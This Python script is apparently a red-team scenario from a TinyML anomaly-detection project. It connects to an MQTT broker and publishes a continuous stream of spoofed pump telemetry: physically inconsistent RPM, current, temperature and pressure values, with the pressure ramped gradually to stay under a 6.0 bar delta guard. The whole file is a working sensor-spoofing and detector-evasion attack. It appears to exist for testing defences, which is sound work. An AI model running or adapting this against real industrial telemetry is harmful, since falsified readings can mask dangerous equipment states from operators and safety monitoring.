import argparse
from datetime import datetime
import json
from pathlib import Path
import sys
import time

_REPO_ROOT = Path(__file__).resolve().parent.parent
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

from common.mqtt_config import ProjectConfig, create_mqtt_client


def get_spoofed_payload(passo_attacco: int):
    """Generate a physically impossible thermodynamic telemetry record that remains syntactically valid."""
    timestamp_str = datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    # Gradual pressure ramp designed to stay below the 6.0 bar instantaneous delta guard
    pressione_inganno = min(6.0 + (passo_attacco * 2.5), 11.5)

    payload_strutturato = {
        "timestamp": timestamp_str,
        "sensori": {
            # --- SPOOFED / PHYSICALLY INCONSISTENT VALUES ---
            "S1_Pompa_RPM": 2900.0,
            "S2_Corrente_A": 2.5,
            "S4_Pres_Mandata_bar": round(pressione_inganno, 2),
            "S9_Temp_Motore_C": 74.0,
            # --- PLAUSIBLE / BENIGN VALUES ---
            "S3_Pres_Aspirazione_bar": 1.5,
            "S5_Portata_Lmin": 125.0,
            "S6_Temp_Fluido_C": 25.0,
            "S7_Vib_Cuscinetto_Ant_mms": 1.0,
            "S8_Vib_Cuscinetto_Post_mms": 0.8,
            "S10_Efficienza_Pct": 88.0,
        },
    }
    return json.dumps(payload_strutturato), pressione_inganno


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("🔴 Red Team: Connesso! Avvio spoofing semantico multivariato...")
    else:
        print(f"Errore connessione: {rc}")


def main():
    cfg = ProjectConfig()
    parser = argparse.ArgumentParser(description="Scenario 3: Stealth thermodynamic/semantic spoofing targeting TinyML.")
    parser.add_argument("--broker", default=cfg.broker_address)
    parser.add_argument("--port", type=int, default=cfg.broker_port)
    parser.add_argument("--topic", default=cfg.topic_telemetry)
    parser.add_argument("--interval", type=float, default=5.0)
    args = parser.parse_args()

    client = create_mqtt_client(client_id="RedTeam_Semantic_Spoofer")
    client.on_connect = on_connect

    print(f"Connessione a {args.broker}...")
    client.connect(args.broker, args.port, 60)
    client.loop_start()

    try:
        print("🔥 LANCIATO ATTACCO DI SPOOFING SEMANTICO 🔥")
        time.sleep(2)

        counter = 0
        while True:
            payload_str, pres_corrente = get_spoofed_payload(counter)
            client.publish(args.topic, payload_str, qos=0)
            counter += 1

            print(
                f"[+] Invio Spoof #{counter} -> "
                f"[RPM: 2900.0 | Corrente: 2.5A | Pressione: {pres_corrente} Bar | Temp: 74.0°C]"
            )
            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n🛑 Attacco semantico interrotto dal Red Team.")
    finally:
        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()

